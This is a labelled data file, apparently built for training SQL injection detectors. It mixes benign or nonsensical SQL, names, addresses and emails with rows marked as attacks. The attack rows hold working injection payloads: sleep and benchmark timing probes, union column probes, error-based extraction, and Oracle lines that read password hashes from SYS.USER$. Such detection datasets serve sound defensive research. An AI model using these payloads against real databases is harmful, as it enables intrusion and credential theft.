Payload	Attacker
  SELECT until,tube,blow FROM stopped LEFT JOIN Orders ON engine.silenceID =  everything.change ORDER BY metal.universe	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 175 )  ORDER BY meta_id ASC	0
1  )   as vxsh where 4706  =  4706	1
SELECT * FROM wore WHERE date = 'exchange'	0
SELECT * FROM newspaper WHERE made NOT LIKE 'common%'	0
3023	0
 UPDATE period SET search = 'problem'WHERE forth = 'oil'	0
1'  )   where 1424  =  1424 and sleep  (  5  )  --	1
SELECT listen ( s )  FROM trace SELECT whatever FROM aside	0
"-7234""  )   union all select 3154,3154,3154,3154#"	1
 SELECT * FROM remove ORDER BY knowledge, yellow	0
"1%""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """	1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  '%'  =  '	1
carlina	0
19224	0
jamaly	0
iif  (  7036  =  2370,1,1/0  )  	1
-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--	1
19294	0
espartero, 103, 5-f	0
1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kbkz'  =  'kbkz	1
   SELECT Employees.accident, COUNT ( Orders.rhythmID )  AS meantFROM    ( OrdersINNER JOIN division ON Orders.stripID  =  Employees.takenID ) 	0
garabatos	0
1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  	1
raysa	0
rgiva	0
hole@chicashumedas.at	0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal"	1
1'  )   where 7658  =  7658 union all select null,null#	1
SELECT * FROM  ( SELECT camera FROM chicken ) 	0
1%'   )    )    union all select null,null--	1
-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl	1
SELECT manufacturing ( s )  FROM nearest LEFT JOIN	0
SELECT column_name FROM table_name WHERE EXISTS	0
"1"" and 2006  =  2006"	1
"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#"	1
"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""kcxw""  =  ""kcxw"	1
waitfor delay '0:0:5'	1
labiano, s/n 7?a	0
calle rafael bravo gomez 179 5?h	0
SELECT MIN ( food )  AS source FROM both	0
SELECT * FROM system WHERE she = 'meet' LIMIT 3	0
 select * from users where id  =  '1' union select +\#,@@VERSION -- 1'	1
1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'cfzp' like 'cfzp	1
naresh	0
1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'	1
1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #	1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069	1
SELECT * FROM expect WHERE chose IN  ( SELECT unit FROM merely ) 	0
coder	0
teuian_balbo@manuelpaloma.ky	0
benigni@viajesdacapalla.pa	0
gussack.reinecke@eddydaniele.pt	0
urbanitzacio las lomas, 18, 4a	0
SELECT * FROM peace WHERE outline = 'scared' FETCH FIRST 3 ROWS ONLY	0
1   )    )    as ipfy where 1189  =  1189	1
1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894	1
SELECT farther ( s FROM two RIGHT JOIN	0
-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
SELECT * FROM carefully FETCH FIRST 3 ROWS ONLY	0
afijacin	0
  SELECT form,last FROM break WHERE paragraph = 'summer' UNION SELECT drive, blanket FROM current	0
-4208%'   )    )     )   or 1133  =  9010--	1
sau nobrega	0
SELECT * FROM lower FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM fear	0
bayliss	0
SELECT * FROM  ( SELECT problem FROM exercise ) 	0
   SELECT COUNT ( completely ) , hole FROM experiment BY graph	0
SELECT heading ( s ) FROM between INNER JOIN	0
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--	1
07559284n	0
FROM  ( SELECT DISTINCT six FROM thrown ) 	0
"1%""  )   union all select null,null,null,null,null,null#"	1
SELECT TOP 3 * FROM drink WHERE house = 'rear' SELECT * FROM himself	0
SELECT sea ( s ) FROM while INNER JOIN	0
SELECT * FROM construction WHERE yes = 'ago'	0
  SELECT * FROM given WHERE good IN  ( 'halfway', 'enemy', 'driven' )  	0
SELECT * FROM left  WHERE please NOT LIKE '[customs]%'	0
"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--"	1
1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
o.toole	0
SELECT * FROM development ORDER BY load DESC	0
messenger@blanquillos.pk	0
SELECT * FROM soon WHERE knew IN  ( SELECT book FROM branch ) 	0
  SELECT speedID AS ID, win AS proper FROM add	0
del cid labastie	0
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf"	1
  SELECT sale,fewer,taught FROM stems LEFT JOIN Orders ON law.bicycleID =  fifty.thy ORDER BY rapidly.fastened	0
SELECT COUNT ( sumID ) FROM entire	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 24 )  ORDER BY meta_id ASC	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30696 )  ORDER BY meta_id ASC	0
ns	1
"  SELECT DAYOFWEEK ( ""2017-06-15"" ) ;"	0
SELECT out ( s )  FROM afternoon	0
-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134	1
1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '	1
ontiveros@masqueclases.th	0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw	1
select * from users where id  =  1 + \+%$ or 1  =  1 -- 1	1
10858	0
1'||  (  select 'zbdv' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'	1
"1%"" waitfor delay '0:0:5'--"	1
SELECT * FROM spoken WHERE price = 'are' LIMIT 3	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i	1
1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--	1
SELECT height FROM chart UNION ALL SELECT parallel FROM principle ORDER BY tax	0
1'  )   union all select null,null,null,null,null,null,null,null,null#	1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367661 ) 	0
"1""  )   as wvxt where 7321  =  7321 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
  SELECT * FROM club WHERE cabin IN  ( 'chart', 'thread', 'carried' )  	0
SELECT * FROM although 3 SELECT * FROM frozen	0
SELECT MIN ( parallel )  AS happily FROM roof	0
vilalba sasserra	0
menospreciativo	0
1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
mccowen@esencialser.mn	0
-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--	1
SELECT line ( s ) FROM dot INNER JOIN	0
mieres	0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt	1
1 or sleep  (  5  )  #	1
  SELECT * FROM believed WHERE was IN  ( 'canal', 'wall', 'excellent' )  	0
1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --	1
SELECT * FROM highway WHERE lucky = 'felt'  OR necessary = 'classroom'	0
sauprobo	0
1'+  (  select 'suzs' where 2905  =  2905 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'	1
  SELECT tape,piano,fed FROM sale LEFT JOIN Orders ON pair.particularlyID =  arm.poem ORDER BY changing.think	0
1'+  (  select 'ixvd' where 4772  =  4772 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'	1
sotalugo	0
vendrell, el	0
alienacin	0
/**/or/**/1/**/  =  /**/1	1
"1%""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """	1
SELECT * FROM fewer WHERE care IN  ( SELECT thank FROM were ) 	0
"1%""  )   and 9198  =  9198--"	1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i	1
1 where 8135  =  8135	1
"-4905"" union all select 6082,6082--"	1
SELECT COUNT ( worthID ) FROM mirror	0
289	0
holtz@pasajesaereosbaratos.es	0
1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --	1
21890	0
kouhi	0
SELECT MIN ( biggest )  AS mind FROM calm	0
griffy	0
SELECT adventure FROM farm	0
5885540000000000	0
-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '	1
1' union all select null,null,null,null,null,null,null,null,null#	1
1 or sleep  (  5  ) 	1
c/ torre de romo s/n 1f	0
SELECT COUNT ( DISTINCT pine )  FROM beauty	0
baumgarten bagudanc	0
SELECT growth ( s )  FROM market	0
SELECT TOP 50 PERCENT * FROM burst	0
reto8sivo	0
-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--	1
SELECT Count ( * )  AS rain	0
1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf	1
1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm	1
SELECT COUNT ( rabbitID ) FROM forth	0
SELECT AVG ( past ) FROM hall SELECT SUM ( property ) 	0
SELECT * FROM arrangement WHERE return BETWEEN certain09/01/1996four AND chart15/31/1996party	0
SELECT characteristic ( s )  FROM hello	0
SELECT interest ( s )  FROM still	0
1'+  (  select 'vidl' where 9445  =  9445 and 5498  =  5777#	1
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy"	1
-2287'   )    )    union all select 1200,1200,1200,1200,1200#	1
DELETE FROM accurate WHERE lonely = 'cow'	0
   SELECT Employees.thirty, COUNT ( Orders.mightyID )  AS peopleFROM    ( OrdersINNER JOIN plus ON Orders.receiveID  =  Employees.mainID ) 	0
   SELECT laid,primitive,pass,education,above     (  (  select JOIN cross ON roll.indicate =  notice.region )   INNER JOIN typicalON Orders.pound =  aid.filmID ) 	0
" select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1"	1
SELECT AVG ( temperature ) FROM available SELECT SUM ( stretch ) 	0
1'   )    )    as gfzb where 7904  =  7904	1
SELECT * FROM nervous WHERE broke = 'repeat' FETCH FIRST 3 ROWS ONLY	0
   SELECT Employees.create, COUNT ( Orders.homeID )  AS captainFROM    ( OrdersINNER JOIN tool ON Orders.simplestID  =  Employees.dailyID ) 	0
   SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2,    A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID  AND A.City  =  B.City 	0
"1"" and make_set  (  8403  =  8403,8899  )   and ""fqxr"" like ""fqxr"	1
DELETE FROM thumb WHERE rise = 'review'	0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982	1
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #	1
steinar	0
1%'   )    )    rlike sleep  (  5  )  #	1
7ar82fa	0
SELECT * FROM personal 3	0
car	0
9.03287E+015	0
SELECT AVG ( egg ) FROM start SELECT SUM ( shop ) 	0
makazaga millares	0
alcatraz, 43, 2-g	0
"-9003""   )    )    union all select 9721,9721--"	1
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1"	1
SELECT * FROM song  WHERE shelf = frozen	0
SELECT * FROM vast WHERE slide = 'known' LIMIT 3	0
056cun95v08ac497	0
gianna	0
6110	0
SELECT * FROM settlers WHERE cloud BETWEEN '1996-07-01' AND '1996-07-31'	0
1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --	1
44651	0
SELECT apart FROM open UNION SELECT ruler FROM forget ORDER BY season	0
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #"	1
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM six	0
SELECT AVG ( excited ) FROM industry SELECT SUM ( mouse ) 	0
1'+  (  select idnb where 2338  =  2338	1
   SELECT listen,income,neck,warn,quietly     (  (  spirit JOIN girl ON jar.dress =  burst.sound )   INNER JOIN stomachON Orders.solid =  voyage.pastID ) 	0
-9975 where 9760  =  9760 order by 1--	1
decour raichs	0
hargreav	0
SELECT * FROM hurry WHERE proper = 'below' FETCH FIRST 3 ROWS ONLY	0
select * from users where id  =  1 +$+ or 1  =  1 -- 1	1
SELECT * FROM town FETCH FIRST 50 PERCENT ROWS ONLY	0
elwes@enla.nu	0
SELECT * FROM shown WHERE center = 'science' LIMIT 3	0
1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  # jpau	1
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#"	1
SELECT * FROM essential WHERE Price NOT BETWEEN 10 AND 20	0
1 where 8908  =  8908 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs	1
1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ogwd' like 'ogwd	1
-2154%' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  '	1
SELECT * FROM sitting  WHERE come = cotton	0
alobras	0
SELECT * FROM fewer ORDER BY suddenly	0
"  SELECT REPEAT ( ""SQL Tutorial"", 3 ) ;"	0
calle santa pola, 7	0
1  )   where 1100  =  1100 and sleep  (  5  )  --	1
SELECT Count ( * )  AS partly	0
1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'	1
portelan9	0
SELECT AVG ( travel ) FROM bus SELECT SUM ( strike ) 	0
"1"" where 1234  =  1234"	1
"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv"	1
rahmani	0
9.90463E+015	0
SELECT form ( s )  FROM grown	0
SELECT amount FROM equipment UNION SELECT sides FROM whose ORDER BY advice	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347686 )  ORDER BY meta_id ASC	0
c/ san gines, 180, 3-d	0
SELECT * FROM  ( SELECT hollow FROM track ) 	0
"1""  )   as pobe where 1704  =  1704"	1
  SELECT * FROM setting WHERE struck IN  ( 'drink', 'giving', 'temperature' )  	0
SELECT * FROM previous WHERE six = 'got' FETCH FIRST 3 ROWS ONLY	0
edelmar	0
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1"	1
or 'text'   =   n'text'	1
4945470000000000	0
1?i0l	0
  SELECT magic,perfectly,its FROM discover LEFT JOIN Orders ON down.broadID =  happened.consist ORDER BY occur.save	0
5672	0
SELECT DISTINCT satisfied FROM book	0
SELECT several	0
SELECT * FROM live	0
1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe	1
5146	0
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'gsjp'  =  'gsjp	1
1 where 5627  =  5627 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
